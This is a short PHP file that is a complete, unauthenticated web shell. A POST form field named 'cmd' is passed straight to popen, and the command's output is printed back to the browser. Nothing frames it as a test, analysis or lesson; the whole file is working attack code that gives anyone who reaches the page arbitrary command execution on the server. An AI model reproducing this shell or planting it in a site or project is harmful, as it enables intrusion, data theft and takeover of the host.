<?

if (isset($_POST[cmd])) {
        $fd = popen($_POST[cmd], "r");
        while (!feof($fd))
                print(str_replace("\n", "<br>", fread($fd, 1024)));
}
?>

<form method="post">
<input type="text" name="cmd" size="50">
<input type="submit">
</form>
